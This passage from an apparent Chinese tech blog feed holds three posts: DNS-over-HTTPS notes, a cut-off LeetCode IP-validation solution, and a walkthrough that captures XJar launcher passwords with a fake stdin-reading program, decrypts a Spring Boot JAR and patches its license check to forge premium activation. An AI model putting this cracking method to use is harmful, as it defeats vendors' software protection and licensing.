域名的请求。</p><p>具体来说，这个二进制数据包中包含了以下信息：</p><ul><li><code>0x0000</code>: 标识着这是一个 DNS 查询报文。</li><li><code>0x0100</code>: 指定使用标准的递归查询方式。</li><li><code>0x0001</code>:表示本次查询中包含一个问题（即要查询的域名）。</li><li><code>0x0000</code>: 在 DNS报文中通常用于回答区域、授权区域和附加区域，但在查询报文中应为 0 。</li><li><code>0x0000</code>: 同上。</li><li><code>0x0000</code>: 同上。</li><li><code>0x07example</code>: 要查询的域名，其中 <code>0x07</code>表示后面跟着的字符串有 7 个字符。</li><li><code>0x03com</code>: 要查询的域名的顶级域名，其中 <code>0x03</code>表示后面跟着的字符串有 3 个字符。</li><li><code>0x00</code>: 表示域名查询结束，这个字节必须存在。</li><li><code>0x0001</code>: 要查询的资源记录类型为 A 类型，即查询目标主机的IPv4 地址。</li><li><code>0x0001</code>: 要查询的资源记录类为 IN 类，即查询 Internet上的地址。</li></ul><p>总之，这个二进制数据包就是一个 DNS 查询请求，用于查询 "<a href="http://example.com">example.com</a>" 这个域名的 IPv4 地址。</p><h4 id="section"><img src="https://googles.plus/images/loading.gif" data-original="/images/DNS-over-HTTPS-DoH-学习笔记/image-20230310173517077.png"></h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token parameter variable">-ne</span> <span class="token string">'\xab\xcd\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'</span><span class="token punctuation">\</span>    <span class="token string">'\x03www\x06google\x03com\x00'</span><span class="token punctuation">\</span>    <span class="token string">'\x00\x01\x00\x01'</span> <span class="token operator">|</span> <span class="token punctuation">\</span>    hexdump <span class="token parameter variable">-C</span><span class="token comment"># Client Request:</span>00000000  ab <span class="token builtin class-name">cd</span> 01 00 00 01 00 00  00 00 00 00 03 <span class="token number">77</span> <span class="token number">77</span> <span class="token number">77</span>  <span class="token operator">|</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.www<span class="token operator">|</span>00000010  06 <span class="token number">67</span> 6f 6f <span class="token number">67</span> 6c <span class="token number">65</span> 03  <span class="token number">63</span> 6f 6d 00 00 01 00 01  <span class="token operator">|</span>.google.com<span class="token punctuation">..</span><span class="token punctuation">..</span>.<span class="token operator">|</span>00000020<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>\xab\xcd\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00</code>它是用来声明一些有用信息的标题，比如<code>ID</code>，<code>flag</code>：“我是一个查询”等等...</p><p><img src="https://googles.plus/images/loading.gif" data-original="/images/DNS-over-HTTPS-DoH-学习笔记/image-20230310183027909.png"></p><p>DNS Payload 逐 bit 的含义可以在 RFC 1035 中找到，Wireshark也有高亮解释。</p><h4 id="响应">响应</h4><p>Cloudflare 的回应显示<em>www.google.com</em>的<code>A</code>记录的长度为4个字节的<code>0x04</code>，其IP为<code>0xd83acd44</code>。</p><p><img src="https://googles.plus/images/loading.gif" data-original="/images/DNS-over-HTTPS-DoH-学习笔记/image-20230310173627003.png"></p><h2 id="dns64">DNS64</h2><p>现在，同时具有 IPv6 和 IPv4连接的双栈网络很常见，但它们远远没有实现通用。为过渡到 IPv6 并部署仅使用IPv6 的网络，网络运营商仍必须保留对仅使用 IPv4的网络和服务的访问权限。有多种转换机制可以提供 IPv6 对 IPv4的访问权限；NAT64 是许多网络运营商越来越受欢迎的选择。使用具有 IPv4-IPv6翻译功能的 NAT64 网关，仅使用 IPv6 的客户端可以通过合成 IPv6地址连接到仅使用 IPv4 的服务，这些地址的前缀是将其路由到 NAT64网关的前缀。</p><p>DNS64 是一种 DNS 服务，可针对仅使用 IPv4 的目的地返回使用这些合成IPv6 地址的 AAAA 记录（DNS 中包含 A 而非 AAAA 记录）。这样，纯 IPv6客户端就可以使用 NAT64 网关，而无需进行任何其他配置。Google 公共 DNS64使用预留的 NAT64 前缀 <code>64:ff9b::/96</code> 以全局服务的形式提供DNS64。</p><h2 id="edns-客户端子网-ecs">EDNS 客户端子网 (ECS)</h2><blockquote><p>OpenDNS ClientSubnetOption:https://github.com/opendns/dnspython-clientsubnetoption</p><p>https://support.opendns.com/hc/en-us/articles/227987667-Installing-and-Using-dnspython-clientsubnetoption</p></blockquote><h2 id="reference">Reference</h2><ul><li>https://developers.google.com/speed/public-dns/docs/doh?hl=zh-cn</li><li>https://github.com/opendns/doh-client</li><li>https://xz.aliyun.com/t/4161</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Cisco </tag>
            
            <tag> Google </tag>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一次XJar加密SprintBoot+自有验证破解</title>
      <link href="/2023/03/09/yi-ci-xjar-jia-mi-sprintboot-zi-you-yan-zheng-po-jie/"/>
      <url>/2023/03/09/yi-ci-xjar-jia-mi-sprintboot-zi-you-yan-zheng-po-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="xjar加密-sprintboot-自有-api-token-验证破解">XJar加密 +SprintBoot + 自有 API Token 验证破解</h1><h2 id="结构分析">结构分析</h2><p>目标服务采用 docker 容器化部署，入口点命令为。</p><p><code>/xjar java -jar /app.jar</code></p><h3 id="jar-分析">JAR 分析</h3><p><img src="https://googles.plus/images/loading.gif" data-original="/images/一次XJar加密SprintBoot-自有验证破解/image-20230309164642265.png"></p><p>可以看到，除了 Spring 的 Bootloader 和静态资源都被主角 XJar加密了，但好在 XJar 加密的过程完整开源，方便我们进行逆向分析。</p><h2 id="xjar">XJar</h2><blockquote><p>https://github.com/core-lib/xjar</p></blockquote><p>支持原生JAR，基于对包内资源加密及拓展 ClassLoader，以此构建一套程序加密启动、动态解密运行的方案。技术非常值得学习，但本质上不能避免源码泄露以及反编译。</p><h3 id="特性">特性</h3><ul><li><p>无代码侵入，只需要把编译好的JAR包通过工具加密即可.</p></li><li><p>完全内存解密，降低源码以及字节码泄露或反编译的风险.</p></li><li><p>支持所有JDK内置加解密算法。</p></li><li><p>可选择需要加解密的字节码或其他资源文件。</p></li><li><p>支持Maven插件, 加密更加便捷。</p></li><li><p>动态生成 Go 启动器，保护密码不泄露。</p></li></ul><h3 id="审查-xjar-源码">审查 XJar 源码</h3><p><img src="https://googles.plus/images/loading.gif" data-original="/images/一次XJar加密SprintBoot-自有验证破解/image-20230309165540121.png"></p><p>XJar 生成加密的 JAR 后，只需要一个 xjar二进制文件作为启动器。其源码位于<code>xjar/src/main/resources/xjar/xjar.go</code>中。这里主要是将加密参数拼接起来，向 Java 传入。</p><h2 id="侧信道攻击">侧信道攻击</h2><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"bufio"</span><span class="token string">"fmt"</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>input <span class="token operator">:=</span> bufio<span class="token punctuation">.</span><span class="token function">NewScanner</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>Stdin<span class="token punctuation">)</span> <span class="token comment">// 初始化扫描对象</span><span class="token keyword">for</span> input<span class="token punctuation">.</span><span class="token function">Scan</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                  <span class="token comment">// 扫描输入内容</span>line <span class="token operator">:=</span> input<span class="token punctuation">.</span><span class="token function">Text</span><span class="token punctuation">(</span><span class="token punctuation">)</span>           <span class="token comment">// 转换为字符串</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span>              <span class="token comment">// 输出到标准输出</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 XJar 的加密原理背景下，每个 JAR的加密参数不同，解密数据位于启动器中。虽然其有加密，但不妨碍我们用伪造的后继程序骗出加密参数。</p><p><img src="https://googles.plus/images/loading.gif" data-original="/images/一次XJar加密SprintBoot-自有验证破解/image-20230309170228802.png"></p><h3 id="jar-包解密">JAR 包解密</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">app</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">io<span class="token punctuation">.</span>xjar<span class="token punctuation">.</span></span><span class="token class-name">XCryptos</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">io<span class="token punctuation">.</span>xjar<span class="token punctuation">.</span></span><span class="token class-name">XEntryFilter</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">io<span class="token punctuation">.</span>xjar<span class="token punctuation">.</span></span><span class="token class-name">XKit</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">io<span class="token punctuation">.</span>xjar<span class="token punctuation">.</span>boot<span class="token punctuation">.</span></span><span class="token class-name">XBoot</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">io<span class="token punctuation">.</span>xjar<span class="token punctuation">.</span>jar<span class="token punctuation">.</span></span><span class="token class-name">XJar</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">io<span class="token punctuation">.</span>xjar<span class="token punctuation">.</span>key<span class="token punctuation">.</span></span><span class="token class-name">XKey</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>compress<span class="token punctuation">.</span>archivers<span class="token punctuation">.</span>jar<span class="token punctuation">.</span></span><span class="token class-name">JarArchiveEntry</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span><span class="token class-name">NoSuchAlgorithmException</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> run <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">String</span> password <span class="token operator">=</span> <span class="token string">"密码"</span><span class="token punctuation">;</span>        <span class="token class-name">XKey</span> xKey<span class="token punctuation">;</span>        <span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                xKey <span class="token operator">=</span> <span class="token class-name">XKit</span><span class="token punctuation">.</span><span class="token function">key</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchAlgorithmException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                <span class="token class-name">XCryptos</span><span class="token punctuation">.</span><span class="token function">decryption</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token string">"C:/Users/sfc9982/Desktop/app.jar"</span><span class="token punctuation">)</span>                        <span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">"密码"</span><span class="token punctuation">)</span>                        <span class="token punctuation">.</span><span class="token function">exclude</span><span class="token punctuation">(</span><span class="token string">"/static/**/*"</span><span class="token punctuation">)</span>                        <span class="token punctuation">.</span><span class="token keyword">to</span><span class="token punctuation">(</span><span class="token string">"C:/Users/sfc9982/Desktop/app-decrypt.jar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//                XBoot.decrypt("C:/Users/sfc9982/Desktop/app.jar", "C:/Users/sfc9982/Desktop/app-decrypt.jar", xKey);</span><span class="token comment">//                XJar.encrypt("C:/Users/sfc9982/Desktop/app-decrypt.jar", "C:/Users/sfc9982/Desktop/app-reenc.jar", xKey);</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里 OOP 的味道很浓，解密用到的方法都可以在相关的 Class中找到。成功运行后，就得到未加密的原始 JAR 文件了。</p><h2 id="java-项目逆向">Java 项目逆向</h2><p>逆向工具使用 JADX 或者 JD-GUI。</p><p>业务代码逻辑比较清晰，这里我的目标主要是绕过一个验证服务，使自己获得高级授期。</p><h3 id="代码">代码</h3><p><img src="https://googles.plus/images/loading.gif" data-original="/images/一次XJar加密SprintBoot-自有验证破解/image-20230309171636246.png"></p><p>这里我们投机取巧，将 <code>this.authUrl</code>改为一个非法值，使其丢出 Exception。然后修改最后 reutrn 回去的JSON，加入激活信息。</p><p>激活信息的格式可以观察校验逻辑和利用原有验证 API 得到。</p><h2 id="结果">结果</h2><p><img src="https://googles.plus/images/loading.gif" data-original="/images/一次XJar加密SprintBoot-自有验证破解/image-20230309171915881.png"></p><p>成功激活！</p><h2 id="summary">Summary</h2><p>条条大路通罗马，有些看起来逆天，但是比较短。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>思科校招算法-验证IP地址-Leetcode.468</title>
      <link href="/2023/03/08/si-ke-xiao-zhao-suan-fa-yan-zheng-ip-di-zhi-leetcode-468/"/>
      <url>/2023/03/08/si-ke-xiao-zhao-suan-fa-yan-zheng-ip-di-zhi-leetcode-468/</url>
      
        <content type="html"><![CDATA[<h1 id="思科校招算法-验证ip地址-leetcode.468">思科校招算法-验证IP地址-Leetcode.468</h1><h2 id="quest">Quest</h2><p>Given a string <code>queryIP</code>, return <code>"IPv4"</code> if IPis a valid IPv4 address, <code>"IPv6"</code> if IP is a valid IPv6address or <code>"Neither"</code> if IP is not a correct IP of anytype.</p><p>A valid IPv4 address is an IP in the form <code>"x1.x2.x3.x4"</code>where <code>0 &lt;= xi &lt;= 255</code> and <code>x_i</code> cannotcontain leading zeros. For example, <code>"192.168.1.1"</code> and<code>"192.168.1.0"</code> are valid IPv4 addresses while<code>"192.168.01.1", "192.168.1.00", and "192.168@1.1"</code> areinvalid IPv4 addresses.</p><p>A valid IPv6 address is an IP in the form<code>"x1:x2:x3:x4:x5:x6:x7:x8"</code> where:</p><ul><li><code>1 &lt;= x_i.length &lt;= 4</code></li><li><code>x_i</code> is a hexadecimal string which may contain digits,lowercase English letter (<code>'a'</code> to <code>'f'</code>) andupper-case English letters (<code>'A'</code> to <code>'F'</code>).</li><li>Leading zeros are allowed in <code>x_i</code>.</li></ul><p>For example, <code>"2001:0db8:85a3:0000:0000:8a2e:0370:7334"</code>and <code>"2001:db8:85a3:0:0:8A2E:0370:7334"</code> are valid IPv6addresses, while <code>"2001:0db8:85a3::8A2E:037j:7334"</code> and<code>"02001:0db8:85a3:0000:0000:8a2e:0370:7334"</code> are invalid IPv6addresses.</p><hr><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;algorithm&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;array&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cctype&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cstdlib&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;vector&gt;</span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">{</span><span class="token keyword">private</span><span class="token operator">:</span>    <span class="token keyword">static</span> <span class="token keyword">constexpr</span> size_t MAX_LENGTH <span class="token operator">=</span> <span class="token number">39</span><span class="token punctuation">;</span>    string                  strFail    <span class="token operator">=</span> <span class="token string">"Neither"</span><span class="token punctuation">;</span>    string                  strIPv4    <span class="token operator">=</span> <span class="token string">"IPv4"</span><span class="token punctuation">;</span>    string                  strIPv6    <span class="token operator">=</span> <span class="token string">"IPv6"</span><span class="token punctuation">;</span>    <span class="token keyword">bool</span> <span class="token function">checkLength</span><span class="token punctuation">(</span><span class="token keyword">const</span> string <span class="token operator">&amp;</span>queryIP<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>queryIP<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> MAX_LENGTH<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">bool</span> <span class="token function">checkIPv4Digits</span><span class="token punctuation">(</span><span class="token keyword">const</span> string <span class="token operator">&amp;</span>digits<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">// length check</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>digits<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> digits<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment">// leading zero</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>digits<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> digits<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token char">'0'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">//  digits.starts_with('0')</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment">// non digit characters</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> <span class="token operator">&amp;</span>c<span class="token operator">:</span> digits<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isdigit</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token comment">// value &gt; 255</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stoi</span><span class="token punctuation">(</span>digits<span class="token punctuation">,</span> <span class="token keyword">nullptr</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">255</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">bool</span> <span class="token function">checkIPv6Digits</span><span class="token punctuation">(</span><span class="token keyword">const</span> string <span class="token operator">&amp;</span>digits<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">// length check</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>digits<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> digits<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment">// non digit characters</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>digits<span class="token punctuation">.</span><span class="token function">find_first_not_of</span><span class="token punctuation">(</span><span class="token string">"0123456789abcdefABCDEF"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">!=</span> string<span class="token double-colon punctuation">::</span>npos<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">bool</span> <span class="token function">checkIPv4</span><span class="token punctuation">(</span>string queryIP<span class="token punctuation">)</span> <span class="token punctuation">{</span>        string         delim <span class="token operator">=</span> <span class="token string">"."</span><span class="token punctuation">;</span>        size_t         pos   <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        string    token<span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span>string<span class="token operator">&gt;</span> digits<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pos <span class="token operator">=</span> queryIP<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>delim<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> string<span class="token double-colon punctuation">::</span>npos<span class="token punctuation">)</span> <span class="token punctuation">{</span>            token <span class="token operator">=</span> queryIP<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> pos<span class="token punctuation">)</span><span class="token punctuation">;</span>            digits<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">;</span>            queryIP<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> pos <span class="token operator">+</span> delim<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        token <span class="token operator">=</span> queryIP<span class="token punctuation">;</span>        digits<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> <span class="token operator">&amp;</span>i<span class="token operator">:</span> digits<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">checkIPv4Digits</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">bool</span> <span class="token function">checkIPv6</span><span class="token punctuation">(</span>string queryIP<span class="token punctuation">)</span> <span class="token punctuation">{</span>        string         delim <span class="token operator">=</span> <span class="token string">":"</span><span class="token punctuation">;</span>        size_t         pos   <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        string    token<span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span>string<span class="token operator">&gt;</span> digits<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pos <span class="token operator">=</span> queryIP<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>delim<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> string<span class="token double-colon punctuation">::</span>npos<span class="token punctuation">)</span> <span class="token punctuation">{</span>            token <span class="token operator">=</span> queryIP<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> pos<span class="token punctuation">)</span><span class="token punctuation">;</span>            digits<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">;</span>            queryIP<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> pos <span class="token operator">+</span> delim<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        token <span class="token operator">=</span> queryIP<span class="token punctuation">;</span>        digits<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> <span class="token operator">&amp;</span>i<span class="token operator">:</span> digits<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">checkIPv6Digits</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">public</span><span class="token operator">:</span>    string <span class="token function">validIPAddress</span><span class="token punctuation">(</span>string queryIP<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">checkLength</span><span class="token punctuation">(</span>queryIP<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> strFail<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span>queryIP<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> queryIP<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token char">'.'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">checkIPv4</span><span class="token punctuation">(</span>queryIP<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> strIPv4<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span>queryIP<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> queryIP<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token char">':'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">checkIPv6</span><span class="token punctuation">(</span>queryIP<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> strIPv6<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> strFail<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token 